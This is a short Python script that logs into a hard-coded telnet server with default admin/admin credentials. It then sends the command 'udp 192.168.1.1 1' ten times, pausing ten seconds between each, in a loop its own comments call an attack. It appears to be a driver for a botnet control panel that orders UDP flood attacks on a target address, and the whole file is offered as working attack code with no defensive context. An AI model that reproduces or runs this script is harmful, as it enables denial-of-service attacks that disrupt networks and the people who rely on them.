import telnetlib
import time

server_ip = '18.95.190.65'
server_port = 400
creds_uname = 'admin'
creds_passwd = 'admin'

attack_period = 10 # 10 seconds

def read_all(telnet):
    r = ''
    while True:
        c = telnet.read_eager()
        r = r+c
        if c is "":
            print(r)
            break

def connect():
    telnet = telnetlib.Telnet(server_ip, server_port)
    telnet.write('\n')
    read_all(telnet)
    # now lets login
    telnet.write(creds_uname+'\n')
    read_all(telnet)
    telnet.write(creds_passwd+'\n')
    time.sleep(10)
    read_all(telnet)

    for i in range(0,10):
     telnet.write('udp 192.168.1.1 1\n') 
     read_all(telnet)
     time.sleep(attack_period)
     read_all(telnet)

connect()
